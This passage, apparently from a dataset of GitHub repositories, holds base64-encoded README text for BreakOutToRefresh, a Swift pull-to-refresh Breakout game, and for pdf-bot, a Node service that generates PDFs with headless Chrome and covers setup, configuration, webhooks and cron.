dGhlIHB1bGwgdG8gcmVmcmVzaCB2aWV3IGluIGEgdGFibGUgdmlldy4gSW4g
dGhpcyBjYXNlIHRoZSBtaW5pIGdhbWUgaXMgQnJlYWtPdXQgYnV0IGEgbG90
IG9mIG90aGVyIG1pbmkgZ2FtZXMgY291bGQgYmUgcHJlc2VudGVkIGluIHRo
aXMgc3BhY2UuCgojIyBJbnN0YWxsYXRpb24KCiMjIyBDb2NvYVBvZHMKCkFk
ZCB0aGlzIHRvIHlvdXIgUG9kZmlsZToKCmBgYAp1c2VfZnJhbWV3b3JrcyEK
CnBvZCAnQnJlYWtPdXRUb1JlZnJlc2gnCmBgYAoKIyMjIE1hbnVhbAoKQWRk
ICoqQnJlYWtPdXRUb1JlZnJlc2hWaWV3LnN3aWZ0KiogdG8geW91ciBwcm9q
ZWN0LgoKIyMgVXNhZ2UKCklmIHlvdSBuZWVkIGl0IG9ubHkgb25jZSBpbiB5
b3VyIGFwcCwgYWRkIHRoaXMgdG8geW91ciB0YWJsZSB2aWV3IGNvbnRyb2xs
ZXI6CmBgYHN3aWZ0CmNsYXNzIERlbW9UYWJsZVZpZXdDb250cm9sbGVyOiBV
SVRhYmxlVmlld0NvbnRyb2xsZXIgewoKICB2YXIgcmVmcmVzaFZpZXc6IEJy
ZWFrT3V0VG9SZWZyZXNoVmlldyEKICAKICAvLyAuLi4KICAKICBvdmVycmlk
ZSBmdW5jIHZpZXdEaWRMb2FkKCkgewogICAgc3VwZXIudmlld0RpZExvYWQo
KQogICAgCiAgICByZWZyZXNoVmlldyA9IEJyZWFrT3V0VG9SZWZyZXNoVmll
dyhzY3JvbGxWaWV3OiB0YWJsZVZpZXcpCiAgICByZWZyZXNoVmlldy5yZWZy
ZXNoRGVsZWdhdGUgPSBzZWxmCiAgCiAgICAvLyBjb25maWd1cmUgdGhlIHJl
ZnJlc2ggdmlldwogICAgcmVmcmVzaFZpZXcuc2NlbmViYWNrZ3JvdW5kQ29s
b3IgPSAud2hpdGUKICAgIHJlZnJlc2hWaWV3LnRleHRDb2xvciA9IC5ibGFj
awogICAgcmVmcmVzaFZpZXcucGFkZGxlQ29sb3IgPSAuYnJvd24KICAgIHJl
ZnJlc2hWaWV3LmJhbGxDb2xvciA9IC5kYXJrR3JheQogICAgcmVmcmVzaFZp
ZXcuYmxvY2tDb2xvcnMgPSBbLmJsdWUsIC5ncmVlbiwgLnJlZF0KICAKICAg
IHRhYmxlVmlldy5hZGRTdWJ2aWV3KHJlZnJlc2hWaWV3KQogIH0gIAp9Cgpl
eHRlbnNpb24gRGVtb1RhYmxlVmlld0NvbnRyb2xsZXI6IFVJU2Nyb2xsVmll
d0RlbGVnYXRlIHsKIAogIG92ZXJyaWRlIGZ1bmMgc2Nyb2xsVmlld0RpZFNj
cm9sbChzY3JvbGxWaWV3OiBVSVNjcm9sbFZpZXcpIHsKICAgIHJlZnJlc2hW
aWV3LnNjcm9sbFZpZXdEaWRTY3JvbGwoc2Nyb2xsVmlldykKICB9CiAgCiAg
b3ZlcnJpZGUgZnVuYyBzY3JvbGxWaWV3V2lsbEVuZERyYWdnaW5nKHNjcm9s
bFZpZXc6IFVJU2Nyb2xsVmlldywgd2l0aFZlbG9jaXR5IHZlbG9jaXR5OiBD
R1BvaW50LCB0YXJnZXRDb250ZW50T2Zmc2V0OiBVbnNhZmVNdXRhYmxlUG9p
bnRlcjxDR1BvaW50PikgewogICAgcmVmcmVzaFZpZXcuc2Nyb2xsVmlld1dp
bGxFbmREcmFnZ2luZyhzY3JvbGxWaWV3LCB3aXRoVmVsb2NpdHk6IHZlbG9j
aXR5LCB0YXJnZXRDb250ZW50T2Zmc2V0OiB0YXJnZXRDb250ZW50T2Zmc2V0
KQogIH0KICAKICBvdmVycmlkZSBmdW5jIHNjcm9sbFZpZXdXaWxsQmVnaW5E
cmFnZ2luZyhzY3JvbGxWaWV3OiBVSVNjcm9sbFZpZXcpIHsKICAgIHJlZnJl
c2hWaWV3LnNjcm9sbFZpZXdXaWxsQmVnaW5EcmFnZ2luZyhzY3JvbGxWaWV3
KQogIH0KfQoKZXh0ZW5zaW9uIERlbW9UYWJsZVZpZXdDb250cm9sbGVyOiBC
cmVha091dFRvUmVmcmVzaERlbGVnYXRlIHsKICAKICBmdW5jIHJlZnJlc2hW
aWV3RGlkUmVmcmVzaChyZWZyZXNoVmlldzogQnJlYWtPdXRUb1JlZnJlc2hW
aWV3KSB7CiAgICAvLyBsb2FkIHN0dWZmIGZyb20gdGhlIGludGVybmV0CiAg
fQoKfQpgYGAKCkluIGNhc2UgeW91IG5lZWQgaXQgbW9yZSB0aGFuIG9uY2Ug
aW4geW91ciBhcHAsIGFkZCB0aGUgc2V0dXAgdG8gYHZpZXdXaWxsQXBwZWFy
YCBhbmQgY2xlYW4gdXAgaW4gYHZpZXdXaWxsRGlzYXBwZWFyYCBsaWtlIHRo
aXM6CgpgYGBzd2lmdApvdmVycmlkZSBmdW5jIHZpZXdXaWxsQXBwZWFyKF8g
YW5pbWF0ZWQ6IEJvb2wpIHsKICBzdXBlci52aWV3V2lsbEFwcGVhcihhbmlt
YXRlZCkKICAKICByZWZyZXNoVmlldyA9IEJyZWFrT3V0VG9SZWZyZXNoVmll
dyhzY3JvbGxWaWV3OiB0YWJsZVZpZXcpCiAgcmVmcmVzaFZpZXcucmVmcmVz
aERlbGVnYXRlID0gc2VsZgogIAogIC8vIGNvbmZpZ3VyZSB0aGUgcmVmcmVz
aCB2aWV3CiAgcmVmcmVzaFZpZXcuc2NlbmViYWNrZ3JvdW5kQ29sb3IgPSAu
d2hpdGUKICByZWZyZXNoVmlldy50ZXh0Q29sb3IgPSAuYmxhY2sKICByZWZy
ZXNoVmlldy5wYWRkbGVDb2xvciA9IC5icm93bgogIHJlZnJlc2hWaWV3LmJh
bGxDb2xvciA9IC5kYXJrR3JheQogIHJlZnJlc2hWaWV3LmJsb2NrQ29sb3Jz
ID0gWy5ibHVlLCAuZ3JlZW4sIC5yZWRdCiAgCiAgdGFibGVWaWV3LmFkZFN1
YnZpZXcocmVmcmVzaFZpZXcpCn0KCm92ZXJyaWRlIGZ1bmMgdmlld1dpbGxE
aXNhcHBlYXIoXyBhbmltYXRlZDogQm9vbCkgewogIHN1cGVyLnZpZXdXaWxs
RGlzYXBwZWFyKGFuaW1hdGVkKQogIAogIHJlZnJlc2hWaWV3LnJlbW92ZUZy
b21TdXBlcnZpZXcoKQogIHJlZnJlc2hWaWV3ID0gbmlsCn0KYGBgCgpXaGVu
IHRoZSBsb2FkaW5nIG9mIG5ldyBjb250ZW50IGlzIGZpbmlzaGVkLCBjYWxs
IGBlbmRSZWZyZXNoaW5nKClgIG9mIHRoZSBgcmVmcmVzaFZpZXdgLgoKV2hl
biBgZW5kUmVmcmVzaGluZygpYCBpcyBjYWxsZWQgdGhlIG1pbmkgZ2FtZSBk
b2Vzbid0IHN0b3AgaW1tZWRpYXRlbHkuIFRoZSBnYW1lIHN0b3BzIChhbmQg
dGhlIHZpZXcgaXMgZGlzbWlzc2VkKSB3aGVuIHRoZSB1c2VyIGxpZnRzIHRo
ZSBmaW5nZXIuIElmIHlvdSBsaWtlIHRvIGVuZCB0aGUgbWluaSBnYW1lIGlt
bWVkaWF0ZWx5IHNldCB0aGUgYGZvcmNlRW5kYCBwcm9wZXJ0eSB0byB0cnVl
LgoKIyMgU3RhdHVzCgpJdCdzIGtpbmQgb2YgYmV0YSBzdGF0dXMuCgojIyBG
ZWVkYmFjawoKSWYgeW91IHVzZSB0aGlzIGNvZGUgb3IgZ290IGluc3BpcmVk
IGJ5IHRoZSBpZGVhIGFuZCBidWlsZCBhbiBhcHAgd2l0aCBhbiBldmVuIG1v
cmUgYXdlc29tZSBQdWxsVG9SZWZyZXNoIGdhbWUsIHBsZWFzZSBsZXQgbWUg
a25vdy4KCiMjIEF1dGhvcgoKRG9taW5payBIYXVzZXIKCltUd2l0dGVyOiBA
ZGFzZG9tXShodHRwczovL3R3aXR0ZXIuY29tL2Rhc2RvbSkKCltkYXNkb20u
Z2l0aHViLmlvXShodHRwczovL2Rhc2RvbS5naXRodWIuaW8vKQoKIyMgU3Vw
cG9ydAoKSWYgeW91IHdhbnQgdG8gZ2l2ZSBtZSBzb21ldGhpbmcgYmFjaywg
SSB3b3VsZCBoaWdobHkgYXBwcmVjaWF0ZSBpZiB5b3UgYnV5IFtteSBib29r
IGFib3V0IFRlc3QtRHJpdmVuIERldmVsb3BtZW50IHdpdGggU3dpZnRdKGh0
dHBzOi8vbGVhbnB1Yi5jb20vdGRkZmFrZWJvb2tmb3Jpb3MpIGFuZCBnaXZl
IG1lIGZlZWRiYWNrIGFib3V0IGl0LiAKCiMjIFRoYW5rcwoKVGhhbmtzIHRv
IFtCZW4gT3p0YWxheV0oaHR0cHM6Ly9naXRodWIuY29tL2JvenRhbGF5L0JP
WlBvbmdSZWZyZXNoQ29udHJvbCkgYW5kIFtyYXl3ZW5kZXJsaWNoLmNvbV0o
aHR0cDovL3d3dy5yYXl3ZW5kZXJsaWNoLmNvbSkgZm9yIGluc3BpcmF0aW9u
LgoKIyMgTGljZW5jZQoKTUlUCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pdf-bot',99672291,"b'\xf0\x9f\xa4\x96 A Node queue API for generating PDFs using headless Chrome. Comes with a CLI, S3 storage and webhooks for notifying subscribers about generated PDFs'",b'JavaScript',15,2389,,2389,False,b'https://api.github.com/repos/esbenp/pdf-bot/forks',"IyDwn6SWIHBkZi1ib3QKClshW25wbV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5p
by9ucG0vdi9wZGYtYm90LnN2ZyldKGh0dHBzOi8vd3d3Lm5wbWpzLmNvbS9w
YWNrYWdlL3BkZi1ib3QpIFshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2
aXMtY2kub3JnL2VzYmVucC9wZGYtYm90LnN2Zz9icmFuY2g9bWFzdGVyKV0o
aHR0cHM6Ly90cmF2aXMtY2kub3JnL2VzYmVucC9wZGYtYm90KSBbIVtDb3Zl
cmFnZSBTdGF0dXNdKGh0dHBzOi8vY292ZXJhbGxzLmlvL3JlcG9zL2dpdGh1
Yi9lc2JlbnAvcGRmLWJvdC9iYWRnZS5zdmc/YnJhbmNoPW1hc3RlcildKGh0
dHBzOi8vY292ZXJhbGxzLmlvL2dpdGh1Yi9lc2JlbnAvcGRmLWJvdD9icmFu
Y2g9bWFzdGVyKQoKRWFzaWx5IGNyZWF0ZSBhIG1pY3Jvc2VydmljZSBmb3Ig
Z2VuZXJhdGluZyBQREZzIHVzaW5nIGhlYWRsZXNzIENocm9tZS4KCmBwZGYt
Ym90YCBpcyBpbnN0YWxsZWQgb24gYSBzZXJ2ZXIgYW5kIHdpbGwgcmVjZWl2
ZSBVUkxzIHRvIHR1cm4gaW50byBQREZzIHRocm91Z2ggaXRzIEFQSSBvciBD
TEkuIGBwZGYtYm90YCB3aWxsIG1hbmFnZSBhIHF1ZXVlIG9mIFBERiBqb2Jz
LiBPbmNlIGEgUERGIGpvYiBoYXMgcnVuIGl0IHdpbGwgbm90aWZ5IHlvdSB1
c2luZyBhIHdlYmhvb2sgc28geW91IGNhbiBmZXRjaCB0aGUgQVBJLiBgcGRm
LWJvdGAgc3VwcG9ydHMgc3RvcmluZyBQREZzIG9uIFMzIG91dCBvZiB0aGUg
Ym94LiBGYWlsZWQgUERGIGdlbmVyYXRpb25zIGFuZCBXZWJob29rIHBpbmdz
IHdpbGwgYmUgcmV0cmllZCBhZnRlciBhIGNvbmZpZ3VyYWJsZSBkZWNheWlu
ZyBzY2hlZHVsZS4KCiFbSG93IHRvIHVzZSB0aGUgcGRmLWJvdCBDTEldKGh0
dHA6Ly9pbWd1ci5jb20vYVJIeWUybC5naWYpCgpgcGRmLWJvdGAgdXNlcyBb
YGh0bWwtcGRmLWNocm9tZWBdKGh0dHBzOi8vZ2l0aHViLmNvbS93ZXN0eTky
L2h0bWwtcGRmLWNocm9tZSkgdW5kZXIgdGhlIGhvb2QgYW5kIHN1cHBvcnRz
IGFsbCB0aGUgc2V0dGluZ3MgdGhhdCBpdCBzdXBwb3J0cy4gTWFqb3IgdGhh
bmtzIHRvIFtAd2VzdHk5Ml0oaHR0cHM6Ly9naXRodWIuY29tL3dlc3R5OTIv
aHRtbC1wZGYtY2hyb21lKSBmb3IgbWFraW5nIHRoaXMgcG9zc2libGUuCgoj
IyBIb3cgZG9lcyBpdCB3b3JrPwoKSW1hZ2luZSB5b3UgaGF2ZSBhbiBhcHAg
dGhhdCBjcmVhdGVzIGludm9pY2VzLiBZb3Ugd2FudCB0byBzYXZlIHRob3Nl
IGludm9pY2VzIGFzIFBERi4gWW91IGluc3RhbGwgYHBkZi1ib3RgIG9uIGEg
c2VydmVyIGFzIGFuIEFQSS4gWW91ciBhcHAgc2VydmVyIHNlbmRzIHRoZSBV
Ukwgb2YgdGhlIGludm9pY2UgdG8gdGhlIGBwZGYtYm90YCBzZXJ2ZXIuIEEg
Y3JvbmpvYiBvbiB0aGUgYHBkZi1ib3RgIHNlcnZlciBrZWVwcyBjaGVja2lu
ZyBmb3IgbmV3IGpvYnMsIGdlbmVyYXRlcyBhIFBERiB1c2luZyBoZWFkbGVz
cyBDaHJvbWUgYW5kIHNlbmRzIHRoZSBsb2NhdGlvbiBiYWNrIHRvIHRoZSBh
cHBsaWNhdGlvbiBzZXJ2ZXIgdXNpbmcgYSB3ZWJob29rLgoKIyMgUHJlcmVx
dWlzaXRlcwoKKiBOb2RlLmpzIHY2IG9yIGxhdGVyCgojIyBJbnN0YWxsYXRp
b24KCmBgYGJhc2gKJCBucG0gaW5zdGFsbCAtZyBwZGYtYm90CiQgcGRmLWJv
dCBpbnN0YWxsCmBgYAoKPiBNYWtlIHN1cmUgdGhlIG5vZGUgcGF0aCBpcyBp
biB5b3VyICRQQVRICgpgcGRmLWJvdCBpbnN0YWxsYCB3aWxsIHByb21wdCBm
b3Igc29tZSBiYXNpYyBjb25maWd1cmF0aW9ucyBhbmQgdGhlbiBjcmVhdGUg
YSBzdG9yYWdlIGZvbGRlciB3aGVyZSB5b3VyIGRhdGFiYXNlIGFuZCBwZGYg
ZmlsZXMgd2lsbCBiZSBzYXZlZC4KCiMjIyBDb25maWd1cmF0aW9uCgpgcGRm
LWJvdGAgY29tZXMgcGFja2FnZWQgd2l0aCBzZW5zaWJsZSBkZWZhdWx0cy4g
QXQgdGhlIHZlcnkgbWluaW11bSB5b3UgbXVzdCBoYXZlIGEgY29uZmlnIGZp
bGUgaW4gdGhlIHNhbWUgZm9sZGVyIGZyb20gd2hpY2ggeW91IGFyZSBleGVj
dXRpbmcgYHBkZi1ib3RgIHdpdGggYSBgc3RvcmFnZVBhdGhgIGdpdmVuLiBI
b3dldmVyLCBpbiByZWFsaXR5IHdoYXQgeW91IHByb2JhYmx5IHdhbnQgdG8g
ZG8gaXMgdXNlIHRoZSBgcGRmLWJvdCBpbnN0YWxsYCBjb21tYW5kIHRvIGdl
bmVyYXRlIGEgY29uZmlndXJhdGlvbiBmaWxlIGFuZCB0aGVuIHVzZSBhbiBh
bGlhcyBgQUxJQVMgcGRmLWJvdCA9ICJwZGYtYm90IC1jIC9ob21lL3BkZi1i
b3QuY29uZmlnLmpzImAKCmBwZGYtYm90LmNvbmZpZy5qc2AKYGBganMKdmFy
IGh0bWxQZGYgPSByZXF1aXJlKCdodG1sLXBkZi1jaHJvbWUnKQoKbW9kdWxl
LmV4cG9ydHMgPSB7CiAgYXBpOiB7CiAgICB0b2tlbjogJ2NyYXp5LXNlY3Jl
dCcKICB9LAogIGdlbmVyYXRvcjogewogICAgY29tcGxldGlvblRyaWdnZXI6
IG5ldyBodG1sUGRmLkNvbXBsZXRpb25UcmlnZ2VyLlRpbWVyKDEwMDApIC8v
IDEgc2VjIHRpbWVvdXQKICB9LAogIHN0b3JhZ2VQYXRoOiAnc3RvcmFnZScK
fQpgYGAKCmBgYGJhc2gKJCBwZGYtYm90IC1jIC4vcGRmLWJvdC5jb25maWcu
anMgcHVzaCBodHRwczovL2VzYmVucC5naXRodWIuaW8KYGBgCgpbU2VlIGEg
ZnVsbCBsaXN0IG9mIHRoZSBhdmFpbGFibGUgY29uZmlndXJhdGlvbiBvcHRp
b25zLl0oI29wdGlvbnMpCgojIyBVc2FnZSBndWlkZQoKIyMjIFN0cnVjdHVy
ZSBhbmQgY29uY2VwdAoKYHBkZi1ib3RgIGlzIG1lYW50IHRvIGJlIGEgbWlj
cm9zZXJ2aWNlIHRoYXQgcnVucyBhIHNlcnZlciB0byBnZW5lcmF0ZSBQREZz
IGZvciB5b3UuIFRoYXQgdXN1YWxseSBtZWFucyB5b3Ugd2lsbCBzZW5kIHJl
cXVlc3RzIGZyb20geW91ciBhcHBsaWNhdGlvbiBzZXJ2ZXIgdG8gdGhlIFBE
RiBzZXJ2ZXIgdG8gcmVxdWVzdCBhbiB1cmwgdG8gYmUgZ2VuZXJhdGVkIGFz
IGEgUERGLiBgcGRmLWJvdGAgd2lsbCBtYW5hZ2UgYSBxdWV1ZSBhbmQgcmV0
cnkgZmFpbGVkIGdlbmVyYXRpb25zLiBPbmNlIGEgam9iIGlzIHN1Y2Nlc3Nm
dWxseSBnZW5lcmF0ZWQgYSBwYXRoIHRvIGl0IHdpbGwgYmUgc2VudCBiYWNr
IHRvIHlvdXIgYXBwbGljYXRpb24gc2VydmVyLgoKTGV0IHVzIGNoZWNrIG91
dCB0aGUgZmxvdyBmb3IgYW4gYXBwIHRoYXQgZ2VuZXJhdGVzIFBERiBpbnZv
aWNlcy4KCmBgYAoxLiAoQXBwIHNlcnZlcik6IEFuIGludm9pY2UgaXMgY3Jl
YXRlZCAtLS0tPiBTZW5kIFVSTCB0byBpbnZvaWNlIHRvIHBkZi1ib3Qgc2Vy
dmVyCjIuIChwZGYtYm90IHNlcnZlcik6IFB1dCB0aGUgVVJMIGluIHRoZSBx
dWV1ZQozLiAocGRmLWJvdCBzZXJ2ZXIpOiBQREYgaXMgZ2VuZXJhdGVkIHVz
aW5nIGhlYWRsZXNzIENocm9tZQo0LiAocGRmLWJvdCBzZXJ2ZXIpOiAoaWYg
ZmFpbGVkIHRyeSBhZ2FpbiB1c2luZyAxIG1pbiwgMyBtaW4sIDEwIG1pbiwg
MzAgbWluLCA2MCBtaW4gZGVsYXkpCjUuIChwZGYtYm90IHNlcnZlcik6IFVw
bG9hZCBQREYgdG8gc3RvcmFnZSAoZS5nLiBBbWF6b24gUzMpCjYuIChwZGYt
Ym90IHNlcnZlcik6IFNlbmQgUzMgbG9jYXRpb24gb2YgUERGIGJhY2sgdG8g
dGhlIGFwcCBzZXJ2ZXIKNy4gKEFwcCBzZXJ2ZXIpOiBSZWNlaXZlIFMzIGxv
Y2F0aW9uIG9mIFBERiAtPiBDaGVjayBzaWduYXR1cmUgc3VtIG1hdGNoZXMg
Zm9yIHNlY3VyaXR5CjguIChBcHAgc2VydmVyKTogSGFuZGxlIFBERiBob3dl
dmVyIHlvdSBzZWUgZml0IChtb3ZlIGl0LCBkb3dubG9hZCBpdCwgc2F2ZSBp
dCBldGMuKQpgYGAKCllvdSBjYW4gc2VuZCBtZXRhIGRhdGEgdG8gdGhlIGBw
ZGYtYm90YCBzZXJ2ZXIgdGhhdCB3aWxsIGJlIHNlbnQgYmFjayB0byB0aGUg
YXBwbGljYXRpb24uIFRoaXMgY2FuIGhlbHAgeW91IGlkZW50aWZ5IHdoYXQg
UERGIHlvdSBhcmUgcmVjZWl2aW5nLgoKIyMjIFNldHVwCgpPbiB5b3VyIGBw
ZGYtYm90YCBzZXJ2ZXIgc3RhcnQgYnkgY3JlYXRpbmcgYSBjb25maWcgZmls
ZSBgcGRmLWJvdC5jb25maWcuanNgLiBbWW91IGNhbiBzZWUgYW4gZXhhbXBs
ZSBmaWxlIGhlcmVdKGh0dHBzOi8vZ2l0aHViLmNvbS9lc2JlbnAvcGRmLWJv
dC9ibG9iL21hc3Rlci9leGFtcGxlcy9wZGYtYm90LmNvbmZpZy5qcykKCmBw
ZGYtYm90LmNvbmZpZy5qc2AKYGBganMKbW9kdWxlLmV4cG9ydHMgPSB7CiAg
YXBpOiB7CiAgICBwb3J0OiAzMDAwLAogICAgdG9rZW46ICdhcGktdG9rZW4n
CiAgfSwKICBzdG9yYWdlOiB7CiAgICAnczMnOiBjcmVhdGVTM0NvbmZpZyh7
CiAgICAgIGJ1Y2tldDogJycsCiAgICAgIGFjY2Vzc0tleUlkOiAnJywKICAg
ICAgcmVnaW9uOiAnJywKICAgICAgc2VjcmV0QWNjZXNzS2V5OiAnJwogICAg
fSkKICB9LAogIHdlYmhvb2s6IHsKICAgIHNlY3JldDogJzEyMzQnLAogICAg
dXJsOiAnaHR0cDovL2xvY2FsaG9zdDozMDAwL3dlYmhvb2tzL3BkZicKICB9
Cn0KYGBgCgpBcyBhIG1pbmltdW0geW91IHNob3VsZCBjb25maWd1cmUgYW4g
YWNjZXNzIHRva2VuIGZvciB5b3VyIEFQSS4gVGhpcyB3aWxsIGJlIHVzZWQg
dG8gYXV0aGVudGljYXRlIGpvYnMgc2VudCB0byB5b3VyIGBwZGYtYm90YCBz
ZXJ2ZXIuIFlvdSBhbHNvIG5lZWQgdG8gYWRkIGEgYHdlYmhvb2tgIGNvbmZp
Z3VyYXRpb24gdG8gaGF2ZSBwZGYgbm90aWZpY2F0aW9ucyBzZW50IGJhY2sg
dG8geW91ciBhcHBsaWNhdGlvbiBzZXJ2ZXIuIFlvdSBzaG91bGQgYWRkIGEg
YHNlY3JldGAgdGhhdCB3aWxsIGJlIHVzZWQgdG8gZ2VuZXJhdGUgYSBzaWdu
YXR1cmUgdXNlZCB0byBjaGVjayB0aGF0IHRoZSByZXF1ZXN0IGhhcyBub3Qg
YmVlbiB0YW1wZXJlZCB3aXRoIGR1cmluZyB0cmFuc2Zlci4KClN0YXJ0IHlv
dXIgQVBJIHVzaW5nCgpgcGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpz
IGFwaWAKClRoaXMgd2lsbCBzdGFydCBhbiBbZXhwcmVzcyBzZXJ2ZXJdKGh0
dHA6Ly9leHByZXNzanMuY29tKSB0aGF0IGxpc3RlbnMgZm9yIG5ldyBqb2Jz
IG9uIHBvcnQgYDMwMDBgLgoKIyMjIyBTZXR0aW5nIHVwIENocm9tZQoKYHBk
Zi1ib3RgIHVzZXMgW2h0bWwtcGRmLWNocm9tZV0oaHR0cHM6Ly9naXRodWIu
Y29tL3dlc3R5OTIvaHRtbC1wZGYtY2hyb21lKSB3aGljaCBpbiB0dXJucyB1
c2VzIFtjaHJvbWUtbGF1bmNoZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9Hb29n
bGVDaHJvbWUvbGlnaHRob3VzZS90cmVlL21hc3Rlci9jaHJvbWUtbGF1bmNo
ZXIpIHRvIGxhdW5jaCBjaHJvbWUuIFlvdSBzaG91bGQgY2hlY2sgb3V0IHRo
b3NlIHR3byByZXNvdXJjZXMgb24gaG93IHRvIHByb3Blcmx5IHNldHVwIENo
cm9tZS4gSG93ZXZlciwgd2l0aCBgY2hyb21lLWxhdW5jaGVyYCBDaHJvbWUg
c2hvdWxkIGJlIHN0YXJ0ZWQgYXV0b21hdGljYWxseS4gT3RoZXJ3aXNlLCBg
aHRtbC1wZGYtY2hyb21lYCBoYXMgYSBzbWFsbCBndWlkZSBvbiBob3cgdG8g
aGF2ZSBpdCBydW5uaW5nIGFzIGEgcHJvY2VzcyB1c2luZyBgcG0yYC4KCllv
dSBjYW4gaW5zdGFsbCBjaHJvbWUgb24gVWJ1bnR1IHVzaW5nCgpgYGAKc3Vk
byBhcHQtZ2V0IHVwZGF0ZSAmJiBhcHQtZ2V0IGluc3RhbGwgY2hyb21pdW0t
YnJvd3NlcgpgYGAKCklmIHlvdSBhcmUgdGVzdGluZyB0aGluZ3Mgb24gT1NY
IG9yIHNpbWlsYXIsIGBjaHJvbWUtbGF1bmNoZXJgIHNob3VsZCBiZSBhYmxl
IHRvIGZpbmQgYW5kIGF1dG9tYXRpY2FsbHkgc3RhcnR1cCBDaHJvbWUgZm9y
IHlvdS4KCiMjIyMgU2V0dGluZyB1cCB0aGUgcmVjZWl2aW5nIEFQSQoKSW4g
dGhlIFtleGFtcGxlcyBmb2xkZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9lc2Jl
bnAvcGRmLWJvdC9ibG9iL21hc3Rlci9leGFtcGxlcy9yZWNlaXZpbmctYXBp
LmpzKSB0aGVyZSBpcyBhIHNtYWxsIGV4YW1wbGUgb24gaG93IHRoZSBhcHBs
aWNhdGlvbiBBUEkgY291bGQgbG9vay4gQmFzaWNhbGx5LCB5b3UganVzdCBo
YXZlIHRvIGRlZmluZSBhbiBlbmRwb2ludCB0aGF0IHdpbGwgcmVjZWl2ZSB0
aGUgd2ViaG9vayBhbmQgY2hlY2sgdGhhdCB0aGUgc2lnbmF0dXJlIG1hdGNo
ZXMuCgpgYGBqYXZhc2NyaXB0CmFwaS5wb3N0KCcvaG9vaycsIGZ1bmN0aW9u
IChyZXEsIHJlcykgewogIHZhciBzaWduYXR1cmUgPSByZXEuZ2V0KCdYLVBE
Ri1TaWduYXR1cmUnLCAnc2hhMT0nKQoKICB2YXIgYm9keUNyeXB0ZWQgPSBy
ZXF1aXJlKCdjcnlwdG8nKQogICAgLmNyZWF0ZUhtYWMoJ3NoYTEnLCAnMTIz
NDUnKQogICAgLnVwZGF0ZShKU09OLnN0cmluZ2lmeShyZXEuYm9keSkpCiAg
ICAuZGlnZXN0KCdoZXgnKQoKICBpZiAoYm9keUNyeXB0ZWQgIT09IHNpZ25h
dHVyZSkgewogICAgcmVzLnN0YXR1cyg0MDEpLnNlbmQoKQogICAgcmV0dXJu
CiAgfQoKICBjb25zb2xlLmxvZygnUERGIHdlYmhvb2sgcmVjZWl2ZWQnLCBK
U09OLnN0cmluZ2lmeShyZXEuYm9keSkpCgogIHJlcy5zdGF0dXMoMjA0KS5z
ZW5kKCkKfSkKYGBgCgojIyMgU2V0dXAgcHJvZHVjdGlvbiBlbnZpcm9ubWVu
dAoKW0ZvbGxvdyB0aGUgZ3VpZGUgdW5kZXIgYHByb2R1Y3Rpb24vYCB0byBz
ZWUgaG93IHRvIHNldHVwIGBwZGYtYm90YCB1c2luZyBgcG0yYCBhbmQgYG5n
aW54YF0oaHR0cHM6Ly9naXRodWIuY29tL2VzYmVucC9wZGYtYm90L2Jsb2Iv
bWFzdGVyL3Byb2R1Y3Rpb24vUkVBRE1FLm1kKQoKIyMjIFNldHVwIGNyb250
YWIKCldlIHNldHVwIG91ciBjcm9udGFiIHRvIGNvbnRpbnVvdXNseSBsb29r
IGZvciBqb2JzIHRoYXQgaGF2ZSBub3QgeWV0IGJlZW4gY29tcGxldGVkLgoK
YGBgYmFzaAoqICogKiAqICogbm9kZSAkKG5wbSBiaW4gLWcpL3BkZi1ib3Qg
LWMgLi9wZGYtYm90LmNvbmZpZy5qcyBzaGlmdDphbGwgPj4gL3Zhci9sb2cv
cGRmYm90LmxvZyAyPiYxCiogKiAqICogKiBub2RlICQobnBtIGJpbiAtZykv
cGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpzIHBpbmc6cmV0cnktZmFp
bGVkID4+IC92YXIvbG9nL3BkZmJvdC5sb2cgMj4mMQpgYGAKCiMjIyBRdWlj
ayBleGFtcGxlIHVzaW5nIHRoZSBDTEkKCkxldCB1cyBhc3N1bWUgSSB3YW50
IHRvIGdlbmVyYXRlIGEgUERGIGZvciBgaHR0cHM6Ly9lc2JlbnAuZ2l0aHVi
LmlvYC4gSSBjYW4gYWRkIHRoZSBqb2IgdXNpbmcgdGhlIGBwZGYtYm90YCBD
TEkuCgpgYGBiYXNoCiQgcGRmLWJvdCAtYyAuL3BkZi1ib3QuY29uZmlnLmpz
IHB1c2ggaHR0cHM6Ly9lc2JlbnAuZ2l0aHViLmlvIC0tbWV0YSAneyJpZCI6
MX0nCmBgYAoKTmV4dCwgaWYgbXkgY3JvbnRhYiBpcyBub3Qgc2V0dXAgdG8g
cnVuIGl0IGF1dG9tYXRpY2FsbHkgSSBjYW4gcnVuIGl0IHVzaW5nIHRoZSBg
c2hpZnQ6YWxsYCBjb21tYW5kCgpgYGBiYXNoCiQgcGRmLWJvdCAtYyAuL3Bk
Zi1ib3QuY29uZmlnLmpzIHNoaWZ0OmFsbApgYGAKClRoaXMgd2lsbCBsb29r
IGZvciB0aGUgb2xkZXN0IHVuY29tcGxldGVkIGpvYiBhbmQgcnVuIGl0LgoK
IyMjIEhvdyBjYW4gSSBnZW5lcmF0ZSBQREZzIGZvciBzaXRlcyB0aGF0IHVz
ZSBKYXZhc2NyaXB0PwoKVGhpcyBpcyBhIGNvbW1vbiBpc3N1ZSB3aXRoIFBE
RiBnZW5lcmF0aW9uLiBMdWNraWx5LCBgaHRtbC1wZGYtY2hyb21lYCBoYXMg
YSByZWFsbHkgYXdlc29tZSBBUEkgZm9yIGRlYWxpbmcgd2l0aCBKYXZhc2Ny
aXB0LiBZb3UgY2FuIHNwZWNpZnkgYSB0aW1lb3V0IGluIG1pbGxpc2Vjb25k
cywgd2FpdCBmb3IgZWxlbWVudHMgb3IgY3VzdG9tIGV2ZW50cy4gVG8gYWRk
